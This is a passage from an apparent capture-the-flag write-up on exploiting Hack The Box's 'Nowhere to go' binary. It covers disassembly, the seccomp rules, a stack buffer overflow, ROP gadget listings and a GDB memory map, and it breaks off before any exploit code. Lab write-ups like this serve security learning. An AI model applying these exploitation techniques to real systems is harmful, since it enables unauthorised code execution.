<!doctype html><html lang="en"><head><title>Nowhere to go | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`. `seccomp` rules"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`. `seccomp` rules"><meta itemprop="keywords" content><meta itemprop="name" content="Nowhere to go"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`. `seccomp` rules"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Nowhere to go"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`. `seccomp` rules"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. vDSO ROP. `sys_execve`. `seccomp` rules"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Nowhere to go"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/nowhere-to-go/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/&amp;text=Nowhere%20to%20go" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/nowhere-to-go/&amp;title=Nowhere%20to%20go" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Nowhere to go</h1><p class="mb4 f6 dib tracked">15 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#disassembly">Disassembly</a></li><li><a href="#seccomp-rules"><code>seccomp</code> rules</a></li><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#vdso-region">vDSO region</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#dumping-vdso">Dumping vDSO</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given compressed filesystem, a kernel image and a <code>qemu</code> script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">file</span> <span class="code-dark-blue">*</span>
bzImage:           Linux kernel x86 boot executable bzImage, version 5.9.16 (buildroot@a7f111e5c8c1) #1 SMP Thu Apr 22 11:04:47 UTC 2021, RO-rootFS, swap_dev 0X8, Normal VGA  
rootfs.cpio.gz:    gzip compressed data, max compression, from Unix, original size modulo 2^32 5115392
run.sh:            Bourne-Again shell script, ASCII text executable
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk8">qemu-system-x86_64</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-m</span><span class="mtk1"> </span><span class="mtk4">128M</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-cpu</span><span class="mtk1"> </span><span class="mtk4">qemu64</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-nographic</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-monitor</span><span class="mtk1"> </span><span class="mtk4">/dev/null</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-kernel</span><span class="mtk1"> </span><span class="mtk4">./bzImage</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-initrd</span><span class="mtk1"> </span><span class="mtk4">./rootfs.cpio.gz</span><span class="mtk1">  </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-append</span><span class="mtk1"> </span><span class="mtk4">'noapic console=ttyS0 loglevel=3 oops=panic panic=</span><span class="mtk4">1 kaslr'</span><span class="mtk1"> </span><span class="mtk6">\</span>  
<span class="mtk1">    </span><span class="mtk6">-net</span><span class="mtk1"> </span><span class="mtk4">user,hostfwd=tcp::5555-:5555</span><span class="mtk1"> </span><span class="mtk6">\</span>
<span class="mtk1">    </span><span class="mtk6">-net</span><span class="mtk1"> </span><span class="mtk4">nic</span>
</code></pre></div><p>Moreover, we are told that the remote kernel image is different from the provided one (which does not make sense for the moment).</p><p>When launching <code>qemu</code>, it starts a server on port 5555:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">./run.sh</span>
SeaBIOS (version 1.15.0-1)


iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8B340+07ECB340 CA00  



Booting from ROM..
Saving random seed: OK
Starting network: OK
Nothing to see here - check host port 5555
</code></pre></div><p>And there is a program running on such port:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">nc</span> 127.0.0.1 5555
Welcome!
asdf
asdf
@       @lYrvYr}YrYrYrYrYrYrYr  
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>First of all, we can decompress the filesystem:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">mkdir</span> rootfs

<span class="code-red">#</span> <span class="code-dark-green">gunzip</span> -k <span class="mtku">rootfs.cpio.gz</span>

<span class="code-red">#</span> <span class="code-dark-green">cd</span> <span class="mtku">rootfs</span>

<span class="code-red">#</span> <span class="code-dark-green">cpio</span> -idm &lt; <span class="mtku">../rootfs.cpio</span>
9991 blocks

<span class="code-red">#</span> <span class="code-dark-green">ls</span>
<span class="code-cyan">bin</span>  <span class="code-green">challenge</span>  <span class="code-blue">dev</span>  <span class="code-blue">etc</span>  flag.txt  <span class="code-blue">home</span>  <span class="code-green">init</span>  <span class="code-cyan">lib</span>  <span class="code-cyan">lib64</span>  <span class="code-cyan">linuxrc</span>  <span class="code-blue">media</span>  <span class="code-blue">mnt</span>  <span class="code-blue">opt</span>  <span class="code-blue">proc</span>  <span class="code-blue">root</span>  <span class="code-blue">run</span>  <span class="code-cyan">sbin</span>  <span class="code-blue">sys</span>  <span class="code-bg-green code-blue">tmp</span>  <span class="code-blue">usr</span>  <span class="code-blue">var</span>  
</code></pre></div><p>The program that runs on port 5555 corresponds to the <code>challenge</code> binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">file</span> <span class="mtku">challenge</span>
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped  

<span class="code-red">#</span> <span class="code-dark-green">checksec</span> <span class="mtku">challenge</span>
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
</code></pre></div><h3 id="disassembly">Disassembly</h3><p>This binary is pretty short, so we can simply view the disassembly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">challenge</span>

challenge:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 &lt;read&gt;:
  401000:       48 8b 74 24 10          mov    rsi,QWORD PTR [rsp+0x10]
  401005:       48 8b 54 24 08          mov    rdx,QWORD PTR [rsp+0x8]
  40100a:       48 c7 c7 00 00 00 00    mov    rdi,0x0
  401011:       48 c7 c0 00 00 00 00    mov    rax,0x0
  401018:       0f 05                   syscall
  40101a:       c3                      ret

000000000040101b &lt;write&gt;:
  40101b:       48 8b 74 24 10          mov    rsi,QWORD PTR [rsp+0x10]
  401020:       48 8b 54 24 08          mov    rdx,QWORD PTR [rsp+0x8]
  401025:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  40102c:       48 c7 c0 01 00 00 00    mov    rax,0x1
  401033:       0f 05                   syscall
  401035:       c3                      ret

0000000000401036 &lt;readwrite&gt;:
  401036:       48 83 ec 20             sub    rsp,0x20
  40103a:       48 89 e3                mov    rbx,rsp
  40103d:       53                      push   rbx
  40103e:       68 80 00 00 00          push   0x80
  401043:       e8 b8 ff ff ff          call   401000 &lt;read&gt;
  401048:       48 83 c4 08             add    rsp,0x8
  40104c:       5b                      pop    rbx
  40104d:       53                      push   rbx
  40104e:       68 80 00 00 00          push   0x80
  401053:       e8 c3 ff ff ff          call   40101b &lt;write&gt;
  401058:       48 83 c4 30             add    rsp,0x30
  40105c:       c3                      ret

000000000040105d &lt;_start&gt;:
  40105d:       48 c7 c7 26 00 00 00    mov    rdi,0x26
  401064:       48 c7 c6 01 00 00 00    mov    rsi,0x1
  40106b:       b8 9d 00 00 00          mov    eax,0x9d
  401070:       0f 05                   syscall
  401072:       48 c7 c7 16 00 00 00    mov    rdi,0x16
  401079:       48 8d 15 80 0f 00 00    lea    rdx,[rip+0xf80]        # 402000 &lt;_secfilter&gt;  
  401080:       52                      push   rdx
  401081:       6a 08                   push   0x8
  401083:       48 89 e2                mov    rdx,rsp
  401086:       48 c7 c6 02 00 00 00    mov    rsi,0x2
  40108d:       b8 9d 00 00 00          mov    eax,0x9d
  401092:       0f 05                   syscall
  401094:       48 83 c4 10             add    rsp,0x10
  401098:       48 8d 05 a1 0f 00 00    lea    rax,[rip+0xfa1]        # 402040 &lt;_greeting&gt;
  40109f:       50                      push   rax
  4010a0:       6a 09                   push   0x9
  4010a2:       e8 74 ff ff ff          call   40101b &lt;write&gt;
  4010a7:       48 83 c4 10             add    rsp,0x10

00000000004010ab &lt;loop_start&gt;:
  4010ab:       e8 86 ff ff ff          call   401036 &lt;readwrite&gt;
  4010b0:       eb f9                   jmp    4010ab &lt;loop_start&gt;
</code></pre></div><h3 id="seccomp-rules"><code>seccomp</code> rules</h3><p>The <code>_start</code> function begins using <code>sys_prctl</code> (<code>$rax = 0x9d</code>) to set <code>seccomp</code> rules:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">000000000040105d &lt;_start&gt;:
  40105d:       48 c7 c7 26 00 00 00    mov    rdi,0x26
  401064:       48 c7 c6 01 00 00 00    mov    rsi,0x1
  40106b:       b8 9d 00 00 00          mov    eax,0x9d
  401070:       0f 05                   syscall
  401072:       48 c7 c7 16 00 00 00    mov    rdi,0x16
  401079:       48 8d 15 80 0f 00 00    lea    rdx,[rip+0xf80]        # 402000 &lt;_secfilter&gt;  
  401080:       52                      push   rdx
  401081:       6a 08                   push   0x8
  401083:       48 89 e2                mov    rdx,rsp
  401086:       48 c7 c6 02 00 00 00    mov    rsi,0x2
  40108d:       b8 9d 00 00 00          mov    eax,0x9d
  401092:       0f 05                   syscall
</code></pre></div><p>We can dump them with <a href="https://github.com/david942j/seccomp-tools"><code>seccomp-tools</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">seccomp-tools</span> dump <span class="mtku">./challenge</span>
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != <span class="rb-cream">ARCH_X86_64</span>) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x03 0x00 0x40000000  if (A &gt;= <span class="rb-green">0x40000000</span>) goto 0007  
 0004: 0x15 0x02 0x00 0x0000000f  if (A == <span class="rb-green">rt_sigreturn</span>) goto 0007
 0005: 0x15 0x01 0x00 0x0000009d  if (A == <span class="rb-green">prctl</span>) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre></div><p>This only disallows the use of <code>sys_rt_sigreturn</code> and <code>sys_prctl</code>. This is not problem because we can execute <code>sys_execve</code> to achieve arbitrary code execution, or even <code>sys_open</code>, <code>sys_read</code>, <code>sys_write</code> to just get the flag.</p><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>After setting <code>seccomp</code> rules, the program prints a greeting message using <code>sys_write</code> and calls <code>loop_start</code>, which is a function that calls <code>readwrite</code> indefinitely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  401094:       48 83 c4 10             add    rsp,0x10
  401098:       48 8d 05 a1 0f 00 00    lea    rax,[rip+0xfa1]        # 402040 &lt;_greeting&gt;  
  40109f:       50                      push   rax
  4010a0:       6a 09                   push   0x9
  4010a2:       e8 74 ff ff ff          call   40101b &lt;write&gt;
  4010a7:       48 83 c4 10             add    rsp,0x10

00000000004010ab &lt;loop_start&gt;:
  4010ab:       e8 86 ff ff ff          call   401036 &lt;readwrite&gt;
  4010b0:       eb f9                   jmp    4010ab &lt;loop_start&gt;
</code></pre></div><p><code>readwrite</code> is a function that calls <code>read</code> and <code>write</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">0000000000401000 &lt;read&gt;:
  401000:       48 8b 74 24 10          mov    rsi,QWORD PTR [rsp+0x10]  
  401005:       48 8b 54 24 08          mov    rdx,QWORD PTR [rsp+0x8]
  40100a:       48 c7 c7 00 00 00 00    mov    rdi,0x0
  401011:       48 c7 c0 00 00 00 00    mov    rax,0x0
  401018:       0f 05                   syscall
  40101a:       c3                      ret

000000000040101b &lt;write&gt;:
  40101b:       48 8b 74 24 10          mov    rsi,QWORD PTR [rsp+0x10]
  401020:       48 8b 54 24 08          mov    rdx,QWORD PTR [rsp+0x8]
  401025:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  40102c:       48 c7 c0 01 00 00 00    mov    rax,0x1
  401033:       0f 05                   syscall
  401035:       c3                      ret

0000000000401036 &lt;readwrite&gt;:
  401036:       48 83 ec 20             sub    rsp,0x20
  40103a:       48 89 e3                mov    rbx,rsp
  40103d:       53                      push   rbx
  40103e:       68 80 00 00 00          push   0x80
  401043:       e8 b8 ff ff ff          call   401000 &lt;read&gt;
  401048:       48 83 c4 08             add    rsp,0x8
  40104c:       5b                      pop    rbx
  40104d:       53                      push   rbx
  40104e:       68 80 00 00 00          push   0x80
  401053:       e8 c3 ff ff ff          call   40101b &lt;write&gt;
  401058:       48 83 c4 30             add    rsp,0x30
  40105c:       c3                      ret
</code></pre></div><p>However, there is a Buffer Overflow vulnerability, because <code>readwrite</code> reserves <code>0x20</code> bytes on the stack, but calls <code>read</code> with a size of <code>$rdx = 0x80</code>. Moreover, <code>write</code> is also called with <code>$rdx = 0x80</code>, which means that we will get a lot of values from the stack, even memory leaks.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>The vulnerabilities are clear. However, the exploitation is hard because the binary is so small. Since NX is enabled, we are forced to use ROP in order to exploit the Buffer Overflow vulnerability. But there are only a few gadgets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">challenge</span>
Gadgets information
============================================================
0x0000000000401089 : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov eax, 0x9d ; syscall
0x0000000000401052 : add al, ch ; ret
0x000000000040106a : add byte ptr [rax + 0x9d], bh ; syscall
0x0000000000401010 : add byte ptr [rax - 0x39], cl ; rol byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall  
0x000000000040102b : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x000000000040104f : add byte ptr [rax], 0 ; add al, ch ; ret
0x0000000000401050 : add byte ptr [rax], al ; add al, ch ; ret
0x0000000000401068 : add byte ptr [rax], al ; add byte ptr [rax + 0x9d], bh ; syscall
0x0000000000401014 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x0000000000401069 : add byte ptr [rax], al ; mov eax, 0x9d ; syscall
0x000000000040100f : add byte ptr [rax], al ; mov rax, 0 ; syscall
0x000000000040102a : add byte ptr [rax], al ; mov rax, 1 ; syscall
0x0000000000401016 : add byte ptr [rax], al ; syscall
0x0000000000401067 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0x9d ; syscall
0x000000000040102f : add dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x0000000000401059 : add esp, 0x30 ; ret
0x0000000000401058 : add rsp, 0x30 ; ret
0x00000000004010b0 : jmp 0x4010ab
0x0000000000401012 : mov eax, 0 ; syscall
0x000000000040106b : mov eax, 0x9d ; syscall
0x000000000040102d : mov eax, 1 ; syscall
0x0000000000401011 : mov rax, 0 ; syscall
0x000000000040102c : mov rax, 1 ; syscall
0x000000000040101a : ret
0x0000000000401013 : rol byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x000000000040102e : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401018 : syscall

Unique gadgets found: 27
</code></pre></div><p>We can only control <code>$rax</code>, with many limitations, and we are not allowed to use <code>sys_rt_sigreturn</code> to restore all registers (like in <a href="https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop">SROP</a>). So, we must come up with another approach.</p><p>If we load the binary in GDB, we will see the following memory map:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span>ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
<span>0x0000000000400000</span> <span>0x0000000000401000</span> <span>0x0000000000001000</span> <span>0x0000000000000000</span> <span>r--</span> <span>./challenge</span>  
